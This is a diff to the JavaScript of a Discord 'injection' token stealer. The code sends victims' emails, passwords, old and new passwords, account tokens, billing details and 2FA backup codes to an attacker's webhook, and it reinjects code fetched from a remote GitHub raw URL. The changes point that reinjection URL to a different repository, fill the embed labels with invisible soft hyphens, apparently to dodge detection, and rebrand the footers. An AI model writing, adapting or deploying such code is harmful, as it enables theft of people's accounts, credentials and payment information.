@@ -16,7 +16,7 @@ const config = {
     ), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
   embed_color: 8363488, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
   webhook: "%WEBHOOK%", //your discord webhook there obviously
-  injection_url: "https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js", //injection url for when it reinjects
+  injection_url: "https://raw.githubusercontent.com/mte0/g/main/inj.js", //injection url for when it reinjects
   /* DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING */
   api: "https://discord.com/api/v9/users/@me",
   bin: "https://dpaste.com/api/",
@@ -367,19 +367,19 @@ const login = async (email, password, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: "**Account Info**",
-            value: `Email: **${email}** - Password: **${password}**`,
+            name: "**A­­C­C­ I­­N­­F­**",
+            value: `E­­m­a­­i­­l: **${email}** - P­­­­a­s­­­­sw­o­r­d­: **${password}**`,
             inline: false,
           },
           {
-            name: "**Discord Info**",
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**\n2fa Codes: ${
+            name: "**D­S­­C I­N­­F**",
+            value: `N­­i­t­­­ro­ Type: **${nitro}**\nB­­ad­­­g­es­: **${badges}**\nBi­­ll­­i­­­­n­g: **${billing}**\n2­­­f­a­ C­­­o­d­e­­s: ${
               mfa.match(config.url_regex) ? `[**click me!**](${mfa})` : "N/A"
             }`,
             inline: false,
           },
           {
-            name: "**Token**",
+            name: "**­T­­­K­­N­­**",
             value: `\`${token}\``,
             inline: false,
           },
@@ -389,7 +389,7 @@ const login = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: "🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection",
+          text: "best mucher by mte - ghv",
         },
       },
     ],
@@ -412,19 +412,19 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: "**Password Changed**",
-            value: `Email: **${json.email}**\nOld Password: **${oldpassword}**\nNew Password: **${newpassword}**`,
+            name: "**P­a­­­ss­w­or­d C­­ha­ng­ed­**",
+            value: `E­­­m­a­il­­: **${json.email}**\nO­ld ­P­a­­­ss­w­o­rd­: **${oldpassword}**\nNew ­Pa­s­s­­­w­o­r­­­d: **${newpassword}**`,
             inline: true,
           },
           {
-            name: "**Discord Info**",
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**\n2fa Codes: ${
+            name: "**­D­­­S­C IN­­F**",
+            value: `N­­it­r­o Type: **${nitro}**\nBa­dg­­e­s: **${badges}**\nB­­­i­l­l­­­in­­g: **${billing}**\n­­2­­f­a­ C­od­es­: ${
               mfa.match(config.url_regex) ? `[**click me!**](${mfa})` : "N/A"
             }`,
             inline: true,
           },
           {
-            name: "**Token**",
+            name: "**­T­K­­N­**",
             value: `\`${token}\``,
             inline: false,
           },
@@ -434,7 +434,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: "🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection",
+          text: "best muncha gh v",
         },
       },
     ],
@@ -457,19 +457,19 @@ const emailChanged = async (email, password, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: "**Email Changed**",
-            value: `New Email: **${email}**\nPassword: **${password}**`,
+            name: "**E­m­ai­l­ Ch­an­g­ed­**",
+            value: `New E­ma­­­i­l: **${email}**\nP­­­a­s­sw­o­rd­:­ **${password}**`,
             inline: true,
           },
           {
-            name: "**Discord Info**",
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**\n2fa Codes: ${
+            name: "**­D­­­S­C IN­­F**",
+            value: `N­­it­r­o Type: **${nitro}**\nBa­dg­­e­s: **${badges}**\nB­­­i­l­l­­­in­­g: **${billing}**\n­­2­­f­a­ C­od­es­: ${
               mfa.match(config.url_regex) ? `[**click me!**](${mfa})` : "N/A"
             }`,
             inline: true,
           },
           {
-            name: "**Token**",
+            name: "**­T­K­­N­**",
             value: `\`${token}\``,
             inline: false,
           },
@@ -479,7 +479,7 @@ const emailChanged = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: "🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection",
+          text: "best muncha gh v",
         },
       },
     ],
